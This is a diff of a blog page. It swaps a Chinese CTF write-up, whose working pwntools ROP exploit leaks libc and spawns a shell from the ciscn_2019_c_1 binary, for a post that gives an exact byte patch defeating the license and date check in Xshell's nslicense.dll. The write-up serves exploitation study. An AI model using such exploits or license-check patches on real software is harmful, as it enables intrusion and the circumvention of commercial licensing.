@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>cisc_2019_c_1 | 2st&#39;s Blog</title>
-  <meta name="keywords" content=" ROP ">
-  <meta name="description" content="cisc_2019_c_1 | 2st&#39;s Blog">
+  <title>阻止Xshell强制更新 | 2st&#39;s Blog</title>
+  <meta name="keywords" content=" Re ">
+  <meta name="description" content="阻止Xshell强制更新 | 2st&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="家庭版还让我强制更新，不如把check日了一劳永逸。发现挺简单的，，nslicense.dll都摆在那等你日了，打开看导出函数有一个CheckLicenseAndPackage，里面有时间比较，改查时间跳转就可以了，静态分析一把梭，提供一下快速解法： 010 editor： 找到  7F 0C 81 F9 80 33 E1 01 0F 86 81  86 -&amp;gt; 83 So easy">
 <meta name="keywords" content="Re">
@@ -584,9 +584,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-cisc_2019_c_1" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-阻止Xshell强制更新" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">cisc_2019_c_1</h1>
+        <h1 class="article-title">阻止Xshell强制更新</h1>
     
     <div class="article-meta">
         
@@ -594,26 +594,26 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="Pwn">Pwn</a>
+                <a href="javascript:" data-rel="商业软件逆向">商业软件逆向</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color4">ROP</a>
+            <a href="javascript:" class="color3">Re</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-02-07 21:12:13'>2020-02-07 21:12</time>
+        创建时间:<time class="date" title='更新时间: 2020-06-06 19:55:31'>2020-06-06 19:55</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:343</span>
+        <span>字数:99</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -648,19 +648,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>入门Pwn的一道题，利用了构造ROP链和泄露libc地址getshell，对于新手来说比较全面，简单记录一下</p>
-<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_153500.png" alt=""></p>
-<p>先检查程序开的保护，开了NX，不能往buf里填shellcode了，没有canary，放心溢出</p>
-<p>看一下程序的流程</p>
-<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_153944.png" alt=""></p>
-<p>简单分析一下，溢出点只能在encrypt里</p>
-<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_154206.png" alt=""></p>
-<p>s和rbp的距离为0x50，那么只需要在覆盖之后利用调用过的puts函数，将puts的真实地址泄露出来，再利用libc.so或者LibcSearcher莽出system和/bin/sh的地址就可以getshell了。泄露之后要让程序再执行一遍gets，这里我选择让他返回encrypt函数。</p>
-<p>由于是64位的程序，所以要把GOT表中puts的地址放入rdi中，所以需要一个pop rdi的gadget</p>
-<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_155647.png" alt=""></p>
-<p>至此，可以写出exp了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//ciscn_2019_1_exp.py</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ciscn_2019_c_1&apos;)</span><br><span class="line">ciscn=ELF(&apos;./ciscn_2019_c_1&apos;)</span><br><span class="line"></span><br><span class="line">puts_plt=ciscn.plt[&apos;puts&apos;]</span><br><span class="line">puts_got=ciscn.got[&apos;puts&apos;]</span><br><span class="line">encrypt = ciscn.symbols[&apos;encrypt&apos;]</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line"></span><br><span class="line">payload =&apos;A&apos; * 0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sh.recvuntil(&apos;Input your choice!\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Input your Plaintext to be encrypted\n&apos;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;@\n&apos;)</span><br><span class="line">puts_addr=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;, puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(&apos;puts&apos;)</span><br><span class="line"></span><br><span class="line">system_addr=libcbase+libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr=libcbase+0x18cd57</span><br><span class="line"></span><br><span class="line">payload =&apos;A&apos;*0x58+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Input your Plaintext to be encrypted\n&apos;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
+        <p>家庭版还让我强制更新，不如把check日了一劳永逸。发现挺简单的，，nslicense.dll都摆在那等你日了，打开看导出函数有一个CheckLicenseAndPackage，里面有时间比较，改查时间跳转就可以了，静态分析一把梭，提供一下快速解法：</p>
+<p>010 editor：</p>
+<p>找到</p>
+<blockquote>
+<p>7F 0C 81 F9 80 33 E1 01 0F <strong>86</strong> 81</p>
+</blockquote>
+<p>86 -&gt; 83</p>
+<p>So easy</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jupmouse@gmail </span>
@@ -670,12 +665,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>cisc_2019_c_1</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">343</span></p>
+    <p><span class="copy-title">文章标题:</span>阻止Xshell强制更新</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">99</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="2st">2st</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-02-07, 21:12:22</p>
-    <p><span class="copy-title">最后更新:</span>2020-02-07, 21:12:13</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/02/07/cisc_2019_c_1/" title="cisc_2019_c_1">https://m-ouse.github.io/2020/02/07/cisc_2019_c_1/</a>
+    <p><span class="copy-title">发布时间:</span>2020-06-06, 19:55:31</p>
+    <p><span class="copy-title">最后更新:</span>2020-06-06, 19:55:31</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/06/06/%E9%98%BB%E6%AD%A2Xshell%E5%BC%BA%E5%88%B6%E6%9B%B4%E6%96%B0/" title="阻止Xshell强制更新">https://m-ouse.github.io/2020/06/06/%E9%98%BB%E6%AD%A2Xshell%E5%BC%BA%E5%88%B6%E6%9B%B4%E6%96%B0/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
